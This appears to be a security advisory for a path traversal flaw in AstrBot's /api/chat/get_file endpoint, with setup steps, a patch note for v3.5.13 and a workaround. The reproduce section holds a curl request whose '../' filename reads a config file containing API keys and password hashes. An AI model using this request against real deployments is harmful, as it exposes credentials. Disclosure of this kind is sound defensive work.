summary: |
  AstrBot Has Path Traversal Vulnerability in /api/chat/get_file
  ### Impact

  This vulnerability may lead to:

  * Information disclosure, such as API keys for LLM providers, account passwords, and other sensitive data.

  ### Reproduce

  Follow these steps to set up a test environment for reproducing the vulnerability:

  1. Install dependencies and clone the repository:

     ```bash
     pip install uv
     git clone https://github.com/AstrBotDevs/AstrBot && cd AstrBot
     uv run main.py
     ```

  2. Alternatively, deploy the program via pip:

     ```bash
     mkdir astrbot && cd astrbot
     uvx astrbot init
     uvx astrbot run
     ```

  3. In another terminal, run the following command to exploit the vulnerability:

     ```bash
     curl -L http://0.0.0.0:6185/api/chat/get_file?filename=../../../data/cmd_config.json
     ```

  This request will read the `cmd_config.json` config file, leading to the leakage of sensitive data such as LLM API keys, usernames, and password hashes (MD5).

  ### Patches

  The vulnerability has been addressed in [Pull Request #1676](https://github.com/AstrBotDevs/AstrBot/pull/1676) and is included in versions >= v3.5.13. All users are strongly encouraged to upgrade to v3.5.13 or later.

  ### Workarounds
  Users can edit the cmd_config.json file to disable the dashboard feature as a temporary workaround. However, it is strongly recommended to upgrade to version v3.5.13 or later as soon as possible to fully resolve this issue.
